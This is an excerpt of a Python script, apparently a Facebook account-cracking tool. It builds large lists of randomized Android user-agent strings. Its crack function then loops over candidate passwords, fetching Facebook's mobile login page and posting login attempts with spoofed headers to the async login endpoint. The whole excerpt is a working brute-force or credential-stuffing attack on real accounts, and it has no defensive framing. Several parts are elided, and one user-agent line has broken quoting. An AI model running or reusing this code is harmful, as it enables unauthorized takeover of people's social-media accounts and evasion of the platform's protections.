...
for xd in range(10000):
	...
	uaku=f'Mozilla/5.0 (Linux; Android 11; Pixel 5 {str(random.randrange)}RD1A.201105.003.C1; wv) AppleWebKit'
	ugen.append(uaku)
...
for t in range(10000):
	rr = random.randint
	rfn1=f'Mozilla/5.0 (Linux; Android 7.1.1; TB-X704A Build/NMF26F; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/'+str(random.randrange(10,116))+'.0.'+str(random.randrange(10,4798))+'.'+str(random.randrange(10,499))+'Safari/537.36 [FB_IAB/FB4A;FBAV/435.0.0.42.112;]'
...
for tt in range(10000):
	...
	zx1=f"Mozilla/5.0 (Linux; Android 7.1.1; OPPO A73 Build/N6F26Q; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/'+str(random.randrange(10,116))+'.0.'+str(random.randrange(10,4798))+'.'+str(random.randrange(10,499))+' Mobile Safari/537.36"
...
def crack(idf,pwv):
	...
	for pw in pwv:
		try:
			link = ses.get('https://m.facebook.com/login.php?skip_api_login=1&api_key=265732506830976&kid_directed_site=0&app_id=265732506830976&signed_next=1&next=https%3A%2F%2Fm.facebook.com%2Fdialog%2Foauth%3Fclient_id%3D265732506830976%26redirect_uri%3Dhttps%253A%252F%252Faccounts.ookbee.com%252Flogin%252FFacebookCallback%26response_type%3Dcode%26state%3DeyJBc09va2JlZVUiOmZhbHNlLCJBcHBDb2RlIjoiSk9ZTEFEQV8yMDkiLCJSZWRpcmVjdFVybCI6Imh0dHBzOi8vd3d3LmlkLmpveWxhZGEuY29tL21lbWJlci9zaWduaW4%252FY3VycmVudD0vIiwiTG9nb0tpbmQiOjB9%26scope%3Demail%26auth_type%26ret%3Dlogin%26fbapp_pres%3D0%26logger_id%3D0ab3b9f2-6416-43b1-9153-c6040426ec7c%26tp%3Dunspecified&cancel_url=https%3A%2F%2Faccounts.ookbee.com%2Flogin%2FFacebookCallback%3Ferror%3Daccess_denied%26error_code%3D200%26error_description%3DPermissions%2Berror%26error_reason%3Duser_denied%26state%3DeyJBc09va2JlZVUiOmZhbHNlLCJBcHBDb2RlIjoiSk9ZTEFEQV8yMDkiLCJSZWRpcmVjdFVybCI6Imh0dHBzOi8vd3d3LmlkLmpveWxhZGEuY29tL21lbWJlci9zaWduaW4%252FY3VycmVudD0vIiwiTG9nb0tpbmQiOjB9%23_%3D_&display=touch&locale=id_ID&pl_dbl=0&refsrc=deprecated&_rdr') 
			data = {
...
'__user':0
			...
			headers = {'Host': 'm.facebook.com','content-length': '3313','sec-ch-ua': '"Chromium";v="108", "Not A(Brand";v="8", "Google Chrome";v="108"','sec-ch-ua-mobile': '?0','user-agent': ua,'content-type': 'application/x-www-form-urlencoded','x-fb-lsd': 'AVpAN7NEKUE','x-asbd-id': '129477','save-data': 'on','sec-ch-ua-platform': '"Windows"','accept': '*/*','origin': 'https://m.facebook.com','sec-fetch-site': 'same-origin','sec-fetch-mode': 'navigate','sec-fetch-dest': 'document','referer': 'https://m.facebook.com/login.php?skip_api_login=1&api_key=265732506830976&kid_directed_site=0&app_id=265732506830976&signed_next=1&next=https%3A%2F%2Fm.facebook.com%2Fdialog%2Foauth%3Fclient_id%3D265732506830976%26redirect_uri%3Dhttps%253A%252F%252Faccounts.ookbee.com%252Flogin%252FFacebookCallback%26response_type%3Dcode%26state%3DeyJBc09va2JlZVUiOmZhbHNlLCJBcHBDb2RlIjoiSk9ZTEFEQV8yMDkiLCJSZWRpcmVjdFVybCI6Imh0dHBzOi8vd3d3LmlkLmpveWxhZGEuY29tL21lbWJlci9zaWduaW4%252FY3VycmVudD0vIiwiTG9nb0tpbmQiOjB9%26scope%3Demail%26auth_type%26ret%3Dlogin%26fbapp_pres%3D0%26logger_id%3D0ab3b9f2-6416-43b1-9153-c6040426ec7c%26tp%3Dunspecified&cancel_url=https%3A%2F%2Faccounts.ookbee.com%2Flogin%2FFacebookCallback%3Ferror%3Daccess_denied%26error_code%3D200%26error_description%3DPermissions%2Berror%26error_reason%3Duser_denied%26state%3DeyJBc09va2JlZVUiOmZhbHNlLCJBcHBDb2RlIjoiSk9ZTEFEQV8yMDkiLCJSZWRpcmVjdFVybCI6Imh0dHBzOi8vd3d3LmlkLmpveWxhZGEuY29tL21lbWJlci9zaWduaW4%252FY3VycmVudD0vIiwiTG9nb0tpbmQiOjB9%23_%3D_&display=touch&locale=id_ID&pl_dbl=0&refsrc=deprecated&_rdr','accept-encoding': 'gzip, deflate','accept-language': 'id-ID,id;q=0.9,en-GB;q=0.8,en;q=0.7,en-US;q=0.6'}
			po = ses.post('https://m.facebook.com/login/device-based/login/async/?api_key=265732506830976&auth_token=7e95e6102c4ab07ec32261f20484242e&skip_api_login=1&signed_next=1&next=https%3A%2F%2Fm.facebook.com%2Fdialog%2Foauth%3Fclient_id%3D265732506830976%26redirect_uri%3Dhttps%253A%252F%252Faccounts.ookbee.com%252Flogin%252FFacebookCallback%26response_type%3Dcode%26state%3DeyJBc09va2JlZVUiOmZhbHNlLCJBcHBDb2RlIjoiSk9ZTEFEQV8yMDkiLCJSZWRpcmVjdFVybCI6Imh0dHBzOi8vd3d3LmlkLmpveWxhZGEuY29tL21lbWJlci9zaWduaW4%252FY3VycmVudD0vIiwiTG9nb0tpbmQiOjB9%26scope%3Demail%26auth_type%26ret%3Dlogin%26fbapp_pres%3D0%26logger_id%3D0ab3b9f2-6416-43b1-9153-c6040426ec7c%26tp%3Dunspecified&refsrc=deprecated&app_id=265732506830976&cancel=https%3A%2F%2Faccounts.ookbee.com%2Flogin%2FFacebookCallback%3Ferror%3Daccess_denied%26error_code%3D200%26error_description%3DPermissions%2Berror%26error_reason3Duser_denied%26state%3DeyJBc09va2JlZVUiOmZhbHNlLCJBcHBDb2RlIjoiSk9ZTEFEQV8yMDkiLCJSZWRpcmVjdFVybCI6Imh0dHBzOi8vd3d3LmlkLmpveWxhZGEuY29tL21lbWJlci9zaWduaW4%252FY3VycmVudD0vIiwiTG9nb0tpbmQiOjB9%23_%3D_&lwv=101',data=data,headers=headers)
